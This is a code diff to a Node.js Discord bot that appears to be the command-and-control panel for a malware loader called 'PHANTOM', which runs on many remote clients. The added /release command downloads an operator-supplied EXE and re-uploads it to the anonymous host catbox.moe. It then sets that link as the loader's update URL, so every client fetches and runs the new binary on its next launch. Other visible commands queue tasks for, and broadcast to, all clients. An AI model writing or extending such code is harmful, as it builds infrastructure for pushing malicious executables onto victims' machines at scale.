@@ -24,6 +24,7 @@
 // ---------------------------------------------------------------------------
 
 import http from 'node:http';
+import https from 'node:https';
 import fs from 'node:fs';
 import path from 'node:path';
 import crypto from 'node:crypto';
@@ -56,6 +57,55 @@ function saveLoaderCfg() {
   } catch (e) {
     console.error('[cfg] save failed:', e.message);
   }
+}
+
+function downloadUrl(url) {
+  return new Promise((resolve, reject) => {
+    const get = (u) => {
+      const mod = u.startsWith('https') ? https : http;
+      mod.get(u, { headers: { 'User-Agent': 'aurora-relay/1.0' } }, (res) => {
+        if (res.statusCode === 301 || res.statusCode === 302)
+          return get(res.headers.location);
+        if (res.statusCode !== 200)
+          return reject(new Error(`HTTP ${res.statusCode}`));
+        const chunks = [];
+        res.on('data', (c) => chunks.push(c));
+        res.on('end', () => resolve(Buffer.concat(chunks)));
+      }).on('error', reject);
+    };
+    get(url);
+  });
+}
+
+function uploadToCatbox(filename, buf) {
+  return new Promise((resolve, reject) => {
+    const boundary = '----CB' + crypto.randomBytes(8).toString('hex');
+    const CRLF = '\r\n';
+    const head = Buffer.from(
+      `--${boundary}${CRLF}Content-Disposition: form-data; name="reqtype"${CRLF}${CRLF}fileupload${CRLF}` +
+      `--${boundary}${CRLF}Content-Disposition: form-data; name="fileToUpload"; filename="${filename}"${CRLF}` +
+      `Content-Type: application/octet-stream${CRLF}${CRLF}`
+    );
+    const foot = Buffer.from(`${CRLF}--${boundary}--${CRLF}`);
+    const body = Buffer.concat([head, buf, foot]);
+    const req = https.request({
+      hostname: 'catbox.moe', port: 443, path: '/user/api.php', method: 'POST',
+      headers: {
+        'Content-Type': `multipart/form-data; boundary=${boundary}`,
+        'Content-Length': body.length,
+      },
+    }, (res) => {
+      let data = '';
+      res.on('data', (c) => (data += c));
+      res.on('end', () => {
+        if (data.startsWith('https://')) resolve(data.trim());
+        else reject(new Error('catbox: ' + data.slice(0, 80)));
+      });
+    });
+    req.on('error', reject);
+    req.write(body);
+    req.end();
+  });
 }
 
 const {
@@ -277,6 +327,9 @@ const commands = [
       { name: 'warn', value: 'warn' }, { name: 'error', value: 'error' })),
   new SlashCommandBuilder().setName('broadcast').setDescription('Message every client')
     .addStringOption((o) => o.setName('text').setDescription('Message').setRequired(true)),
+  new SlashCommandBuilder().setName('release').setDescription('Upload new loader build — triggers auto-update on all clients')
+    .addStringOption((o) => o.setName('version').setDescription('Version string e.g. 3 or 3.1').setRequired(true))
+    .addAttachmentOption((o) => o.setName('file').setDescription('New loader EXE').setRequired(true)),
   new SlashCommandBuilder().setName('loaderconfig').setDescription('Update PHANTOM loader config')
     .addSubcommand((s) => s.setName('set')
       .setDescription('Set one field')
@@ -351,6 +404,22 @@ client.on('interactionCreate', async (i) => {
         store.set(id, r); n++;
       }
       return ok(`Queued for ${n} client${n === 1 ? '' : 's'}.`);
+    }
+    case 'release': {
+      const ver  = i.options.getString('version');
+      const att  = i.options.getAttachment('file');
+      await i.deferReply({ flags: 64 });
+      try {
+        const buf = await downloadUrl(att.url);
+        const url = await uploadToCatbox(att.name, buf);
+        loaderCfg.version    = ver;
+        loaderCfg.update_url = url;
+        saveLoaderCfg();
+        await i.editReply(`Released **v${ver}** → \`${url}\`\nAll clients will update on next launch.`);
+      } catch (e) {
+        await i.editReply(`Release failed: ${e.message}`);
+      }
+      break;
     }
     case 'loaderconfig': {
       const sub = i.options.getSubcommand();
